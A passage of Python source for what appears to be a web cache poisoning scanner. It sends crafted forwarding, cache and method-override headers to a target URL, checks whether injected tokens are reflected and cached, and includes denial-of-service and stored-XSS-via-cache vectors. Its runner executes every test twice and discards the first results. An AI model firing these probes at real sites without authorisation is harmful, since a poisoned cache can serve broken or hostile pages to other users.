            "downgrade": downgrade, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "scheme downgrade cached" if vuln else "",
        })
    return findings


def test_xhmo_extended(url):
    findings = []
    for method in XHMO_METHODS:
        r = fetch(url, headers={"X-HTTP-Method-Override": method})
        if not r: continue
        cacheable, _ = is_cacheable(r)
        vuln = cacheable
        findings.append({
            "vector_id": "V60", "name": "X-HTTP-Method-Override",
            "override_method": method, "status": r.status_code,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "method override cached" if vuln else "",
        })
    return findings


def test_forwarded_header_poisoning(url):
    findings = []
    for fwd_tmpl in FORWARDED_PROBES:
        token = random_token(8)
        fwd = fwd_tmpl.replace("{token}", token)
        r = fetch(url, headers={"Forwarded": fwd})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        location = r.headers.get("location", "")
        loc_reflect = token in location
        redirect = 300 <= r.status_code < 400
        vuln = (reflected or loc_reflect) and cacheable
        findings.append({
            "vector_id": "V61", "name": "Forwarded Header Poisoning",
            "forwarded": fwd[:100], "status": r.status_code,
            "reflected": reflected, "location_reflected": loc_reflect,
            "redirect": redirect, "location": location[:120],
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "Forwarded header reflected + cached" if vuln else "",
        })
    return findings


def test_xforwarded_prefix(url):
    findings = []
    for prefix_tmpl in XFPREFIX_PROBES:
        token = random_token(8)
        prefix = prefix_tmpl.replace("{token}", token)
        r = fetch(url, headers={"X-Forwarded-Prefix": prefix})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V62", "name": "X-Forwarded-Prefix",
            "prefix": prefix, "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "prefix reflected + cached" if vuln else "",
        })
    return findings


def test_xoriginal_host(url):
    findings = []
    for xoh_tmpl in XOH_PROBES:
        token = random_token(8)
        xoh = xoh_tmpl.replace("{token}", token)
        r = fetch(url, headers={"X-Original-Host": xoh})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V63", "name": "X-Original-Host",
            "host_value": xoh, "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "X-Original-Host reflected + cached" if vuln else "",
        })
    return findings


def test_xbackend_server(url):
    findings = []
    for xbs_tmpl in XBS_PROBES:
        token = random_token(8)
        xbs = xbs_tmpl.replace("{token}", token)
        r = fetch(url, headers={"X-Backend-Server": xbs})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V64", "name": "X-Backend-Server",
            "backend_value": xbs, "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "X-Backend-Server reflected + cached" if vuln else "",
        })
    return findings


def test_xcache_key(url):
    findings = []
    for xck_tmpl in XCK_PROBES:
        token = random_token(8)
        xck = xck_tmpl.replace("{token}", token)
        r = fetch(url, headers={"X-Cache-Key": xck})
        if not r: continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        resp_ck = r.headers.get("x-cache-key", "")
        ck_reflect = token in resp_ck
        vuln = (reflected or ck_reflect) and cacheable
        findings.append({
            "vector_id": "V65", "name": "X-Cache-Key Manipulation",
            "cache_key": xck, "status": r.status_code,
            "response_cache_key": resp_ck,
            "reflected": reflected or ck_reflect,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "X-Cache-Key reflected in response" if vuln else "",
        })
    return findings


def test_xcache_hits(url):
    findings = []
    for hits in XCH_PROBES:
        r = fetch(url, headers={"X-Cache-Hits": hits})
        if not r: continue
        cacheable, _ = is_cacheable(r)
        resp_hits = r.headers.get("x-cache-hits", "")
        vuln = cacheable and resp_hits == hits
        findings.append({
            "vector_id": "V66", "name": "X-Cache-Hits Manipulation",
            "sent_hits": hits, "response_hits": resp_hits,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "X-Cache-Hits reflected" if vuln else "",
        })
    return findings


def test_xserved_by(url):
    findings = []
    for xsb_tmpl in XSB_PROBES:
        token = random_token(8)
        xsb = xsb_tmpl.replace("{token}", token)
        r = fetch(url, headers={"X-Served-By": xsb})
        if not r: continue
        resp_sb = r.headers.get("x-served-by", "")
        sb_reflect = token in resp_sb
        cacheable, _ = is_cacheable(r)
        vuln = sb_reflect and cacheable
        findings.append({
            "vector_id": "V67", "name": "X-Served-By Manipulation",
            "sent_value": xsb, "response_value": resp_sb,
            "status": r.status_code, "reflected": sb_reflect,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "X-Served-By reflected + cached" if vuln else "",
        })
    return findings


def test_xtimer(url):
    findings = []
    for xt_tmpl in XTIMER_PROBES:
        token = random_token(8)
        xt = xt_tmpl.replace("{token}", token)
        r = fetch(url, headers={"X-Timer": xt})
        if not r: continue
        resp_xt = r.headers.get("x-timer", "")
        xt_reflect = token in resp_xt
        cacheable, _ = is_cacheable(r)
        vuln = xt_reflect and cacheable
        findings.append({
            "vector_id": "V68", "name": "X-Timer Manipulation",
            "sent_value": xt, "response_value": resp_xt,
            "status": r.status_code, "reflected": xt_reflect,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "X-Timer reflected + cached" if vuln else "",
        })
    return findings


def test_response_header_reflection(url):
    """V69-V80: generic response header reflection tests."""
    findings = []
    for key, cfg in RESPONSE_HEADER_PROBES.items():
        vid = key.split("_")[0]
        name, hname, send_vals = cfg
        for val_tmpl in send_vals:
            token = random_token(8)
            val = val_tmpl.replace("{token}", token)
            r = fetch(url, headers={hname: val})
            if not r: continue
            resp_val = r.headers.get(hname, "")
            header_reflect = token in resp_val
            body_reflect = check_reflection(r, token)
            cacheable, _ = is_cacheable(r)
            vuln = (header_reflect or body_reflect) and cacheable
            findings.append({
                "vector_id": vid, "name": name,
                "sent_header": hname, "sent_value": val[:100],
                "response_header_value": resp_val[:120],
                "header_reflected": header_reflect,
                "body_reflected": body_reflect,
                "status": r.status_code, "cacheable": cacheable,
                "cf_cache_status": r.headers.get("cf-cache-status", ""),
                "vulnerable": vuln,
                "note": ("response header reflected + cached"
                         if header_reflect else
                         "body reflected + cached" if body_reflect else ""),
            })
    return findings


# ============================================================
#  MASTER RUNNER — all 80 vectors
# ============================================================

ALL_VECTOR_KEYS = (
    "V1_V7_headers", "V8_fat_get",
    "V9_param_cloaking", "V10_normalization",
    "V11_unkeyed_cookies", "V12_tracking_params",
    "V13_suspicious_params", "V14_multi_headers",
    "V15_16_dom", "V17_resource_import",
    "V18_canonical", "V19_open_redirect",
    "V20_stored_xss",
    "V21_hho_dos", "V22_hmc_dos", "V23_hmo_dos", "V24_cpdos",
    "V25_wrong_port", "V26_scheme_downgrade", "V27_routing_override",
    "V28_param_pollution", "V29_cache_key_confusion", "V30_vary_abuse",
    "V31_large_header", "V32_invalid_encoding", "V33_semicolon",
    "V34_dot_delimiter", "V35_null_byte", "V36_newline_byte",
    "V37_static_ext", "V38_cache_deception", "V39_path_confusion",
    "V40_delimiter_discrepancy", "V41_normalization",
    "V42_cacheable_4xx", "V43_cf_4xx", "V44_ats_fragment",
    "V45_fastly_host", "V46_body_poisoning", "V47_header_bruteforce",
    "V48_cdn_norm", "V49_cachekey_discrepancy", "V50_edge_case",
    # ---- NEW V51-V80 ----
    "V51_content_type", "V52_accept_encoding",
    "V53_accept_language", "V54_user_agent",
    "V55_referer", "V56_cookie_poison",
    "V57_host_header", "V58_xff", "V59_xfp",
    "V60_xhmo_extended", "V61_forwarded",
    "V62_xforwarded_prefix", "V63_xoriginal_host",
    "V64_xbackend_server", "V65_xcache_key",
    "V66_xcache_hits", "V67_xserved_by", "V68_xtimer",
    "V69_V80_response_headers",
)


def run_advanced_vectors(url):
    """Master runner for V1-V80."""

    """Master runner for V1-V80 with LIVE progress output in terminal."""

    # (key, label, function) — order = execution order
    VECTOR_STEPS = [
        # ---- V1-V20 ----
        ("V1_V7_headers",            "V1-V7  Header-based poisoning",   test_advanced_headers),
        ("V8_fat_get",               "V8     Fat GET",                  test_fat_get),
        ("V9_param_cloaking",        "V9     Parameter cloaking",       test_param_cloaking),
        ("V10_normalization",        "V10    Cache-key normalization",  test_cache_key_normalization),
        ("V11_unkeyed_cookies",      "V11    Unkeyed Cookie Poisoning", test_unkeyed_cookies),
        ("V12_tracking_params",      "V12    Unkeyed Query (tracking)", test_tracking_params),
        ("V13_suspicious_params",    "V13    Unkeyed Query Parameter",  test_suspicious_params),
        ("V14_multi_headers",        "V14    Multi Unkeyed Headers",    test_multi_headers),
        ("V15_16_dom",               "V15/16 DOM Cache Poisoning",      test_dom_poisoning),
        ("V17_resource_import",      "V17    Resource Import",          test_resource_import),
        ("V18_canonical",            "V18    Canonical Hijack",         test_canonical_hijack),
        ("V19_open_redirect",        "V19    Open Redirect Chain",      test_open_redirect_chain),
        ("V20_stored_xss",           "V20    Stored XSS via Cache",     test_stored_xss_via_cache),
        # ---- V21-V30 ----
        ("V21_hho_dos",              "V21    Header Oversize DoS",      test_hho_dos),
        ("V22_hmc_dos",              "V22    Meta Character DoS",       test_hmc_dos),
        ("V23_hmo_dos",              "V23    Method Override DoS",      test_hmo_dos),
        ("V24_cpdos",                "V24    Cache-Poisoned DoS",       test_cpdos),
        ("V25_wrong_port",           "V25    Wrong Port Reflection",    test_wrong_port_reflection),
        ("V26_scheme_downgrade",     "V26    Scheme Downgrade",         test_scheme_downgrade),
        ("V27_routing_override",     "V27    Routing Override",         test_routing_override),
        ("V28_param_pollution",      "V28    Parameter Pollution",      test_parameter_pollution),
        ("V29_cache_key_confusion",  "V29    Cache-Key Confusion",      test_cache_key_confusion),
        ("V30_vary_abuse",           "V30    Vary Header Abuse",        test_vary_abuse),
        # ---- V31-V50 ----
        ("V31_large_header",         "V31    Large Header Poisoning",   test_large_header_poisoning),
        ("V32_invalid_encoding",     "V32    Invalid Encoding",         test_invalid_encoding),
        ("V33_semicolon",            "V33    Semicolon Delimiter",      test_semicolon_delimiter),
        ("V34_dot_delimiter",        "V34    Dot Delimiter",            test_dot_delimiter),
        ("V35_null_byte",            "V35    Null Byte Truncation",     test_null_byte_truncation),
        ("V36_newline_byte",         "V36    Newline Byte",             test_newline_byte),
        ("V37_static_ext",           "V37    Static Extension Abuse",   test_static_extension_abuse),
        ("V38_cache_deception",      "V38    Cache Deception",          test_cache_deception_paths),
        ("V39_path_confusion",       "V39    Path Confusion",           test_path_confusion),
        ("V40_delimiter_discrepancy","V40    Delimiter Discrepancy",    test_delimiter_discrepancy),
        ("V41_normalization",        "V41    Normalization Discrepancy",test_normalization_discrepancy),
        ("V42_cacheable_4xx",        "V42    Cacheable 4xx Error",      test_cacheable_4xx),
        ("V43_cf_4xx",               "V43    CF 4xx Cacheable",         test_cf_4xx_cacheable),
        ("V44_ats_fragment",         "V44    ATS Fragment Poisoning",   test_ats_fragment_poisoning),
        ("V45_fastly_host",          "V45    Fastly Host Poisoning",    test_fastly_host_poisoning),
        ("V46_body_poisoning",       "V46    Request Body Poisoning",   test_request_body_poisoning),
        ("V47_header_bruteforce",    "V47    Header Bruteforce",        test_header_bruteforce),
        ("V48_cdn_norm",             "V48    CDN Normalization Bug",    test_cdn_normalization_bug),
        ("V49_cachekey_discrepancy", "V49    Cache-Key Discrepancy",    test_cache_key_discrepancy),
        ("V50_edge_case",            "V50    Edge Case Cache Poisoning",test_edge_case_cache_poisoning),
        # ---- V51-V68 ----
        ("V51_content_type",         "V51    Content-Type Confusion",   test_content_type_confusion),
        ("V52_accept_encoding",      "V52    Accept-Encoding Abuse",    test_accept_encoding_abuse),
        ("V53_accept_language",      "V53    Accept-Language Poisoning",test_accept_language_poisoning),
        ("V54_user_agent",           "V54    User-Agent Poisoning",     test_user_agent_poisoning),
        ("V55_referer",              "V55    Referer Poisoning",        test_referer_poisoning),
        ("V56_cookie_poison",        "V56    Cookie Poisoning",         test_cookie_poisoning_advanced),
        ("V57_host_header",          "V57    Host Header Poisoning",    test_host_header_poisoning),
        ("V58_xff",                  "V58    X-Forwarded-For Poisoning",test_xff_poisoning),
        ("V59_xfp",                  "V59    X-Forwarded-Proto Poisoning", test_xfp_poisoning),
        ("V60_xhmo_extended",        "V60    X-HTTP-Method-Override",   test_xhmo_extended),
        ("V61_forwarded",            "V61    Forwarded Header Poisoning",test_forwarded_header_poisoning),
        ("V62_xforwarded_prefix",    "V62    X-Forwarded-Prefix",       test_xforwarded_prefix),
        ("V63_xoriginal_host",       "V63    X-Original-Host",          test_xoriginal_host),
        ("V64_xbackend_server",      "V64    X-Backend-Server",         test_xbackend_server),
        ("V65_xcache_key",           "V65    X-Cache-Key Manipulation", test_xcache_key),
        ("V66_xcache_hits",          "V66    X-Cache-Hits Manipulation",test_xcache_hits),
        ("V67_xserved_by",           "V67    X-Served-By Manipulation", test_xserved_by),
        ("V68_xtimer",               "V68    X-Timer Manipulation",     test_xtimer),
        # ---- V69-V80 ----
        ("V69_V80_response_headers", "V69-V80 Response Header Reflect", test_response_header_reflection),
    ]

    results = {"url": url}
    total = len(VECTOR_STEPS)
    t_start = time.time()
    total_vuln = 0
    total_findings = 0

    print(C.CC + "    [>] Running " + str(total) +
          " vector groups on " + url + C.D)
    print(C.CC + "    " + "-" * 68 + C.D)

    for idx, (key, label, fn) in enumerate(VECTOR_STEPS, 1):
        sys.stdout.write(
            C.CC + "    [{:>2}/{}] ".format(idx, total) + C.D +
            C.BOLD + label.ljust(38) + C.D + " ... "
        )
        sys.stdout.flush()

        t0 = time.time()
        try:
            res = fn(url)
        except Exception as e:
            print(C.R + "ERROR: " + str(e) + C.D)
            res = []
        elapsed = time.time() - t0

        results[key] = res or []
        total_findings += len(res)

        if res:
            vuln = sum(1 for x in res if x.get("vulnerable"))
            total_vuln += vuln
            if vuln:
                print(C.R + "[VULN " + str(vuln) + "/" + str(len(res)) + "]" + C.D +
                      C.CC + "  ({:.1f}s)".format(elapsed) + C.D)
            else:
                print(C.G + "[safe " + str(len(res)) + "]" + C.D +
                      C.CC + "  ({:.1f}s)".format(elapsed) + C.D)
        else:
            print(C.Y + "[no findings]" + C.D +
                  C.CC + "  ({:.1f}s)".format(elapsed) + C.D)

    total_time = time.time() - t_start
    print(C.CC + "    " + "-" * 68 + C.D)
    print(C.CC + "    [>] All " + str(total) + " vector groups done in " +
          "{:.1f}s   ({} findings total)".format(total_time, total_findings) + C.D)
    if total_vuln:
        print(C.R + C.BOLD + "    [!!!] Vulnerable findings: " +
              str(total_vuln) + C.D)
    else:
        print(C.G + "    [+] No vulnerable findings." + C.D)





    
    return {
        "url": url,
        # ---- V1-V50 ----
        "V1_V7_headers":         test_advanced_headers(url),
        "V8_fat_get":            test_fat_get(url),
        "V9_param_cloaking":     test_param_cloaking(url),
        "V10_normalization":     test_cache_key_normalization(url),
        "V11_unkeyed_cookies":   test_unkeyed_cookies(url),
        "V12_tracking_params":   test_tracking_params(url),
        "V13_suspicious_params": test_suspicious_params(url),
        "V14_multi_headers":     test_multi_headers(url),
        "V15_16_dom":            test_dom_poisoning(url),
        "V17_resource_import":   test_resource_import(url),
        "V18_canonical":         test_canonical_hijack(url),
        "V19_open_redirect":     test_open_redirect_chain(url),
        "V20_stored_xss":        test_stored_xss_via_cache(url),
        "V21_hho_dos":           test_hho_dos(url),
        "V22_hmc_dos":           test_hmc_dos(url),
        "V23_hmo_dos":           test_hmo_dos(url),
        "V24_cpdos":             test_cpdos(url),
        "V25_wrong_port":        test_wrong_port_reflection(url),
        "V26_scheme_downgrade":  test_scheme_downgrade(url),
        "V27_routing_override":  test_routing_override(url),
        "V28_param_pollution":   test_parameter_pollution(url),
        "V29_cache_key_confusion": test_cache_key_confusion(url),
        "V30_vary_abuse":        test_vary_abuse(url),
        "V31_large_header":      test_large_header_poisoning(url),
        "V32_invalid_encoding":  test_invalid_encoding(url),
        "V33_semicolon":         test_semicolon_delimiter(url),
        "V34_dot_delimiter":     test_dot_delimiter(url),
        "V35_null_byte":         test_null_byte_truncation(url),
        "V36_newline_byte":      test_newline_byte(url),
        "V37_static_ext":        test_static_extension_abuse(url),
        "V38_cache_deception":   test_cache_deception_paths(url),
        "V39_path_confusion":    test_path_confusion(url),
        "V40_delimiter_discrepancy": test_delimiter_discrepancy(url),
        "V41_normalization":     test_normalization_discrepancy(url),
        "V42_cacheable_4xx":     test_cacheable_4xx(url),
        "V43_cf_4xx":            test_cf_4xx_cacheable(url),
        "V44_ats_fragment":      test_ats_fragment_poisoning(url),
        "V45_fastly_host":       test_fastly_host_poisoning(url),
        "V46_body_poisoning":    test_request_body_poisoning(url),
        "V47_header_bruteforce": test_header_bruteforce(url),
        "V48_cdn_norm":          test_cdn_normalization_bug(url),
        "V49_cachekey_discrepancy": test_cache_key_discrepancy(url),
        "V50_edge_case":         test_edge_case_cache_poisoning(url),
        # ---- V51-V80 ----
        "V51_content_type":      test_content_type_confusion(url),
        "V52_accept_encoding":   test_accept_encoding_abuse(url),
        "V53_accept_language":   test_accept_language_poisoning(url),
        "V54_user_agent":        test_user_agent_poisoning(url),
        "V55_referer":           test_referer_poisoning(url),
        "V56_cookie_poison":     test_cookie_poisoning_advanced(url),
        "V57_host_header":       test_host_header_poisoning(url),
        "V58_xff":               test_xff_poisoning(url),
        "V59_xfp":               test_xfp_poisoning(url),
        "V60_xhmo_extended":     test_xhmo_extended(url),
        "V61_forwarded":         test_forwarded_header_poisoning(url),
        "V62_xforwarded_prefix": test_xforwarded_prefix(url),
        "V63_xoriginal_host":    test_xoriginal_host(url),
        "V64_xbackend_server":   test_xbackend_server(url),
        "V65_xcache_key":        test_xcache_key(url),
        "V66_xcache_hits":       test_xcache_hits(url),
        "V67_xserved_by":        test_xserved_by(url),
        "V68_xtimer":            test_xtimer(url),
        "V69_V80_response_headers": test_response_header_reflection(url),
    }


# ============================================================
#  ADVANCED REPORT (English)
# ============================================================

def save_advanced_report(all_results, path):
    lines = []
    lines.append("=" * 78)
    lines.append("  ADVANCED CACHE POISONING REPORT (V1-V80)")
    lines.append("=" * 78)
    lines.append("")

    for r in all_results:
        url = r["url"]
        lines.append("Target URL : " + url)
        lines.append("-" * 78)

        # ---- V1-V7 ----
        lines.append("Vectors V1-V7 : Header-based poisoning")
        for f in r.get("V1_V7_headers", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  [{vid}] {name}".format(vid=f["vector_id"], name=f["name"]))
            lines.append("        header sent     : {h}: {v}".format(h=f["header"], v=f["sent_value"]))
            lines.append("        response status : {s}".format(s=f["status"]))
            lines.append("        reflected       : {ref}".format(ref=f["reflected"]))
            lines.append("        redirect        : {rd}  location={loc}".format(
                rd=f["redirect"], loc=f["location"] or "-"))
            lines.append("        cacheable       : {ch}  (cf={cf}, age={ag})".format(
                ch=f["cacheable"], cf=f["cf_cache_status"] or "-", ag=f["age"] or "-"))
            lines.append("        verdict         : " + verdict)
            if f["note"]:
                lines.append("        note            : " + f["note"])
            lines.append("")

        # ---- V8 ----
        lines.append("Vector V8 : Fat GET")
        for f in r.get("V8_fat_get", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  body={b}  status={s}  cacheable={c}  -> {res}".format(
                b=f["body"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V9 ----
        lines.append("Vector V9 : Parameter cloaking")
        for f in r.get("V9_param_cloaking", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  variant={vr}  param={p}  cacheable={c}  -> {res}".format(
                vr=f["variant"], p=f["param"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V10 ----
        lines.append("Vector V10 : Cache-key normalization")
        for f in r.get("V10_normalization", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  probe={p}  status={s}  cacheable={c}  -> {res}".format(
                p=f["probe"], s=f["status"], c=f["cacheable"], res=verdict))
            lines.append("        tested URL : " + f["tested_url"])
        lines.append("")

        # ---- V11 ----
        lines.append("Vector V11 : Unkeyed Cookie Poisoning")
        for f in r.get("V11_unkeyed_cookies", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  cookie={ck}  status={s}  reflected={ref}  cacheable={ch}  -> {res}".format(
                ck=f["cookie_name"], s=f["status"], ref=f["reflected"],
                ch=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V12 ----
        lines.append("Vector V12 : Unkeyed Query String (tracking params)")
        for f in r.get("V12_tracking_params", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  param={p}  reflected={ref}  cacheable={c}  -> {res}".format(
                p=f["param"], ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V13 ----
        lines.append("Vector V13 : Unkeyed Query Parameter")
        for f in r.get("V13_suspicious_params", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  param={p}  reflected={ref}  cacheable={c}  -> {res}".format(
                p=f["param"], ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V14 ----
        lines.append("Vector V14 : Multiple Unkeyed Headers")
        for f in r.get("V14_multi_headers", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  combo={n}  status={s}  redirect={rd}  loc_reflect={lr}  cacheable={c}  -> {res}".format(
                n=f["combo"], s=f["status"], rd=f["redirect"],
                lr=f["location_reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V15/16 ----
        lines.append("Vector V15/V16 : DOM-based Cache Poisoning")
        for f in r.get("V15_16_dom", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  param={p}  reflected={ref}  is_html={h}  cacheable={c}  -> {res}".format(
                p=f["param"], ref=f["reflected"], h=f["is_html"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V17 ----
        lines.append("Vector V17 : Resource Import Reflection")
        for f in r.get("V17_resource_import", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}  resources={n}  reflected={ref}  cacheable={c}  -> {res}".format(
                h=f["header"], n=f["resource_count"],
                ref=f["reflected"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V18 ----
        lines.append("Vector V18 : Canonical Tag Hijacking")
        for f in r.get("V18_canonical", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}  reflected_in_canonical={rc}  cacheable={c}  -> {res}".format(
                h=f["header"], rc=f["reflected_in_canonical"],
                c=f["cacheable"], res=verdict))
            for cn in f.get("hijacked_canonicals", [])[:2]:
                lines.append("        canonical: " + cn)
        lines.append("")

        # ---- V19 ----
        lines.append("Vector V19 : Open Redirect Chain")
        for f in r.get("V19_open_redirect", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}  status={s}  redirect={rd}  loc_reflect={lr}  cacheable={c}  -> {res}".format(
                h=f["header"], s=f["status"], rd=f["redirect"],
                lr=f["location_reflected"], c=f["cacheable"], res=verdict))
            if f["location"]:
                lines.append("        Location: " + f["location"])
        lines.append("")

        # ---- V20 ----
        lines.append("Vector V20 : Stored XSS via Cache")
        for f in r.get("V20_stored_xss", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  inj={i}  status={s}  reflected={ref}  cacheable={c}  -> {res}".format(
                i=f["injection"], s=f["status"], ref=f["reflected"],
                c=f["cacheable"], res=verdict))
            lines.append("        payload: " + f["payload"][:60])
        lines.append("")

        # ---- V21 ----
        lines.append("Vector V21 : HTTP Header Oversize (HHO) DoS")
        for f in r.get("V21_hho_dos", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  size={sz}  status={s}  cacheable={c}  -> {res}".format(
                sz=f["header_size"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V22 ----
        lines.append("Vector V22 : HTTP Meta Character (HMC) DoS")
        for f in r.get("V22_hmc_dos", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}  value={val}  status={s}  cacheable={c}  -> {res}".format(
                h=f["header"], val=f["value_preview"], s=f["status"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V23 ----
        lines.append("Vector V23 : HTTP Method Override (HMO) DoS")
        for f in r.get("V23_hmo_dos", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  override={m}  status={s}  cacheable={c}  -> {res}".format(
                m=f["override_method"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V24 ----
        lines.append("Vector V24 : Cache-Poisoned DoS (CPDoS)")
        for f in r.get("V24_cpdos", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}  value={val}  status={s}  cacheable={c}  -> {res}".format(
                h=f["header"], val=f["value_preview"], s=f["status"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V25 ----
        lines.append("Vector V25 : Wrong Port Reflection")
        for f in r.get("V25_wrong_port", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  port={p}  status={s}  redirect={rd}  cached={c}  -> {res}".format(
                p=f["port"], s=f["status"], rd=f["redirect"],
                c=f["cacheable"], res=verdict))
            if f["location"]:
                lines.append("        Location: " + f["location"])
        lines.append("")

        # ---- V26 ----
        lines.append("Vector V26 : Scheme Downgrade")
        for f in r.get("V26_scheme_downgrade", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}: {val}  status={s}  redirect={rd}  cached={c}  -> {res}".format(
                h=f["header"], val=f["value"], s=f["status"],
                rd=f["redirect"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V27 ----
        lines.append("Vector V27 : Routing Override")
        for f in r.get("V27_routing_override", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}: {p}  status={s}  accessible={a}  cached={c}  -> {res}".format(
                h=f["header"], p=f["override_path"], s=f["status"],
                a=f["accessible"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V28 ----
        lines.append("Vector V28 : Parameter Pollution")
        for f in r.get("V28_param_pollution", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  variant={vr}  status={s}  cacheable={c}  -> {res}".format(
                vr=f["variant"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V29 ----
        lines.append("Vector V29 : Cache-Key Confusion")
        for f in r.get("V29_cache_key_confusion", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  variant={vr}  status={s}  cacheable={c}  -> {res}".format(
                vr=f["variant"], s=f["status"], c=f["cacheable"], res=verdict))
            lines.append("        tested URL : " + f["tested_url"])
        lines.append("")

        # ---- V30 ----
        lines.append("Vector V30 : Vary Header Abuse")
        for f in r.get("V30_vary_abuse", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  name={n}  status={s}  cacheable={c}  -> {res}".format(
                n=f["name"], s=f["status"], c=f["cacheable"], res=verdict))
            if f.get("note"):
                lines.append("        note: " + f["note"])
        lines.append("")

        # ---- V31 ----
        lines.append("Vector V31 : Large Header Poisoning")
        for f in r.get("V31_large_header", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  header={h}  size={sz}  status={s}  cacheable={c}  -> {res}".format(
                h=f["header"], sz=f["size"], s=f["status"],
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V32 ----
        lines.append("Vector V32 : Invalid Encoding")
        for f in r.get("V32_invalid_encoding", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  encoding={e}  status={s}  cacheable={c}  -> {res}".format(
                e=f["encoding"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V33 ----
        lines.append("Vector V33 : Semicolon Delimiter")
        for f in r.get("V33_semicolon", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  probe={p}  status={s}  cacheable={c}  -> {res}".format(
                p=f["probe"], s=f["status"], c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V34 ----
        lines.append("Vector V34 : Dot Delimiter")
        for f in r.get("V34_dot_delimiter", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  ext={e}  status={s}  ct={ct}  cacheable={c}  -> {res}".format(
                e=f["extension"], s=f["status"], ct=f["content_type"] or "-",
                c=f["cacheable"], res=verdict))
        lines.append("")

        # ---- V35 ----
        lines.append("Vector V35 : Null Byte Truncation")
        for f in r.get("V35_null_byte", []):
            verdict = "VULNERABLE" if f["vulnerable"] else "not vulnerable"
            lines.append("  probe={p}  status={s}  cacheable={c}  -> {res}".format(
                p=f["probe"], s=f["status"], c=f["cacheable"], res=verdict))
